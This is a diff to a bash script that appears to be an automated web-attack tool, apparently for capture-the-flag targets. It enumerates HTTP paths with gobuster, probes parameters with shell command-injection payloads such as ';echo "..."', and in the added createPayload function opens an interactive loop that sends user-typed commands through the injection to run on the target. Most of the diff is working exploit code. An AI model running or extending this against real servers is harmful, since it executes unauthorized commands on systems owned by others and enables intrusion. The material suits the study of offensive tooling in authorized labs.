@@ -1,5 +1,4 @@
 #!/bin/bash
-
 declare -A port_service_dict
 declare -A port_version_dict
 declare -A http_service_dict
@@ -233,8 +232,8 @@ stage8() {
 prompt_next_stage() {
     local next_stage="$1"
     echo " "
-    echo "Continue to next stage, go back to menu, print summary or quit"
-    read -p "(next/menu/summary/quit): " choice
+    echo "Continue to next stage, go back to menu, print summary or exit"
+    read -p "(next/menu/summary/exit): " choice
     echo " "
     case "$choice" in
         "next")
@@ -246,7 +245,7 @@ prompt_next_stage() {
         "summary")
             echo "place holder"
             ;;
-        "quit")
+        "exit")
             exit
             ;;
         *)
@@ -414,9 +413,13 @@ enumerateSite()
 
    if [[ "$httpPorts" == "ALL" ]]; then
         for key in "${cleanHTTP[@]}"; do
-            paths=()
-            output=$(gobuster -np -q -u "http://$targetIP:$key" -w "$discoveryPath")
             paths="/"
+            testCurl=$(curlCall -s "$targetIP:$key/.awdad") # test to make sure it's not taking everything
+            if [[ -n $testCurl ]]; then
+                echo "All URLs are accessible, which means none truly are on port $targetIP:$key"
+                continue
+            fi
+            output=$(gobuster -np -q -u "http://$targetIP:$key" -w "$discoveryPath")
             paths+=($(echo "$output" | awk '/\(Status: [0-9]{3}\)/ {gsub(/\(Status: [0-9]{3}\)/, "", $1); print $1}'))
             if [[ ${#paths[@]} -gt 1 ]]; then
                 echo " "
@@ -441,9 +444,14 @@ enumerateSite()
 
         # Perform gobuster for each port
         for port in "${cleanHTTP[@]}"; do
-            paths=() # clear paths
-            output=$(gobuster -np -q -u "http://$targetIP:$port" -w "$discoveryPath")
             paths="/"
+            testCurl=$(curlCall -s -o /dev/null -w "%{http_code}" "$targetIP:$port/.awdad") # Check the HTTP response code
+            if [[ $testCurl -ne 404 ]]; then
+                echo $testCurl
+                echo "All URLs are accessible, which means none truly are on port $targetIP:$port"
+                continue
+            fi
+            output=$(gobuster -np -q -u "http://$targetIP:$port" -w "$discoveryPath")
             paths+=($(echo "$output" | awk '/\(Status: [0-9]{3}\)/ {gsub(/\(Status: [0-9]{3}\)/, "", $1); print $1}'))
             if [[ ${#paths[@]} -gt 1 ]]; then
                 echo " "
@@ -473,7 +481,7 @@ exploreSite()
         while [[ $i -lt ${#pages[@]} ]]; do # Crawls all avaliable pages
             page="${pages[$i]}"
             #echo "Checking Page: $page"
-            output=$(curl -s -L "$targetIP:$key$page")
+            output=$(curlCall -s -L "$targetIP:$key$page")
             hrefs=($(echo "$output" | sed -n 's/.*href="\([^"]*\)".*/\1/p'))
             # add support for scripts later
 
@@ -521,7 +529,7 @@ webAttack() {
         cleanHTTP=()
         getPortList "$httpPorts" cleanHTTP
         for key in "${cleanHTTP[@]}"; do
-            response=$(curl -s "$targetIP:$key")
+            response=$(curlCall -s "$targetIP:$key")
             if [[ -n "$response" ]]; then
                 site_map_dict[$key]="/"
             fi
@@ -535,7 +543,7 @@ webAttack() {
     for port in "${!site_map_dict[@]}"; do
         # File Traversal
         for url in ${site_map_dict[$port]}; do
-            response=$(curl -s "$targetIP:$port$url")
+            response=$(curlCall -s "$targetIP:$port$url")
             if [[ -n "$response" ]]; then
                 searchFlag=$(echo "$response" | grep -oE '{[^}]*\}')
                 siteForms=$(echo "$response" | sed -n '/<form/,/<\/form>/p')
@@ -556,7 +564,7 @@ webAttack() {
                     if [[ "$rce_boolean" = "True" ]]; then
                         echo "$targetIP:$port is vulnerable to RCE injection on page $url"
                         # TODO: Store payload for later exploiting
-                        echo "Payload: $payload"
+                        createPayload "$payload" "RCE"
                     fi
                 fi
             fi
@@ -585,30 +593,81 @@ travelFiles()
 }
 
 rce() {
+    #$set -x # Debug
     root=$(echo "$1" | cut -d'=' -f1)
     searchWord="The Lightning Thief Strikes Again"
-
+    rce_injections=(
+    "\";echo \"$searchWord\"\""
+    "';echo \"$searchWord\"'")
     # Define the injection string
-    injection="';echo \"$searchWord\"'"
-    encoded_injection=$(urlencode "$injection")
+    #injection="\";echo \"$searchWord\"\""
+    for injection in "${rce_injections[@]}"; do
+        encoded_injection=$(urlencode "$injection")
 
-    # Make the curl request
-    output=$(curl -s "${root}=${encoded_injection}")
+        # Make the curl request
+        output=$(curlCall -s "${root}=${encoded_injection}" )
 
-    # Check if the output contains the search word
-    if [[ -n "$output" ]]; then
-        check=$(echo "$output" | grep "$searchWord")
-        if [[ -n "$check" ]]; then
-            # Return "True" and the payload
-            echo "True ${root}=${injection}"
-        else
-            # Return "False" if no match is found
-            echo "False"
+        # Check if the output contains the search word
+        if [[ -n "$output" ]]; then
+            check=$(echo "$output" | grep "$searchWord" | grep -v "echo")
+            if [[ -n "$check" ]]; then
+                # Return "True" and the payload
+                echo "True ${root}=${injection}"
+                break
+            fi
         fi
-    else
-        # Return "False" if curl output is empty
-        echo "False"
+    done
+}
+
+curlCall()
+{
+    max_retries=5
+    retry_count=0
+
+    while [[ $retry_count -lt $max_retries ]]; do
+        local response=$(curl --max-time 5 "$@")
+        if [[ $? -ne 0 ]]; then
+            sleep 2
+            ((retry_count++))
+        else
+            echo "$response"
+            break
+        fi
+    done
+    if [[ $retry_count -eq $max_retries ]]; then
+    echo "Failed to get a successful response after $max_retries retries."
     fi
+
+}
+
+createPayload()
+{
+    echo " "
+    echo "Payload: $1"
+    echo " "
+    read -p "Would you like to attempt an exploit at this time? (y/n): " payload_response
+    if [[ "$payload_response" = "y" ]]; then
+        if [[ "$2" = "RCE" ]]; then
+            temp_command=$(urlencode 'echo [YOUR_INPUT_APPEARS_HERE]')
+            temp_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$temp_command/")
+            temp_output=$(curlCall -s "$temp_payload" | sed -n 's/<[^>]*>//gp' | sed '/^[[:space:]]*$/d')
+            echo "$temp_output"
+            echo " "
+
+            while true; do
+                read -p "Enter Command (type 'quit' to exit): " payload_command
+                if [[ $payload_command = "quit" ]]; then
+                    break
+                else
+                    new_command=$(urlencode "$payload_command | xargs")
+                    new_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$new_command/")
+                    exploit_output=$(curlCall -s "$new_payload" | sed -n 's/<[^>]*>//gp' | sed '/^[[:space:]]*$/d')
+                    echo "$exploit_output"
+                fi
+            done
+        fi
+    fi
+
 }
 
 echo " "
